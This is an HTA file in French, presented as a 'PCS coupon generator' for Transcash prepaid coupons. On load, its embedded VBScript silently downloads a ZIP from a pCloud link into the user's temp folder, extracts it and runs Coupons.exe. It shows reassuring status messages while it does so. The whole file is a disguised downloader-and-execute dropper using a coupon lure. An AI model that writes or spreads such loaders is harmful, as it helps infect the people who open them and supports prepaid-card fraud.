<html>
<head>
<HTA:APPLICATION 
  ID="App"
  APPLICATIONNAME="Coupon Generator"
  BORDER="dialog"
  CAPTION="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
/>
<title>Générateur PCS</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #fefefe;
    color: #333;
    padding: 40px;
    text-align: center;
  }
  h1 {
    color: #e67e22;
    font-size: 1.8em;
  }
  .status {
    margin-top: 30px;
    font-size: 1.1em;
    color: #2980b9;
  }
</style>
<script language="VBScript">
Sub Window_OnLoad
  On Error Resume Next

  document.body.insertAdjacentHTML "beforeEnd", "<div class='status' id='status'>Téléchargement du coupon en cours...</div>"

  Dim fso, shell, tempFolder, zipURL, zipPath, extractPath, http, stream, shellApp
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set shell = CreateObject("WScript.Shell")
  tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
  zipPath = tempFolder & "\\Coupon_Transcash.zip"
  extractPath = tempFolder & "\\PCS"

  ' === MODIFIE ICI AVEC TON LIEN DIRECT VERS LE ZIP SUR GITHUB ===
  zipURL = "https://e.pcloud.link/publink/download?code=XZHos6ZxzW6QFB2NoHjEsQeRaI8oyectU8V"
"https://github.com/tonNomUtilisateur/tonDepot/releases/download/v1.0/Coupon_Transcash.zip"
  ' Exemple de lien GitHub direct vers un fichier dans une release

  ' Téléchargement
  Set http = CreateObject("Microsoft.XMLHTTP")
  http.Open "GET", zipURL, False
  http.Send

  If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binaire
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile zipPath, 2 ' écrase si existe
    stream.Close
    document.getElementById("status").innerText = "✅ Téléchargement terminé. Extraction en cours..."
  Else
    MsgBox "Erreur de téléchargement.", 16, "Erreur"
    Exit Sub
  End If

  ' Extraction du ZIP
  Set shellApp = CreateObject("Shell.Application")
  If Not fso.FolderExists(extractPath) Then
    fso.CreateFolder extractPath
  End If

  shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items(), 4
  ' Pause pour laisser le temps à l'extraction (ajuster si nécessaire)
  WScript.Sleep 3000

  ' Exécution
  If fso.FileExists(extractPath & "\\Coupons.exe") Then
    shell.Run Chr(34) & extractPath & "\\Coupons.exe" & Chr(34), 1, False
    document.getElementById("status").innerText = "🎉 Coupon généré avec succès !"
  Else
    document.getElementById("status").innerText = "❌ Fichier Coupons.exe introuvable."
  End If
End Sub
</script> </head>
<body>
  <h1>Générateur de Coupon PCS</h1>
</body>
</html>
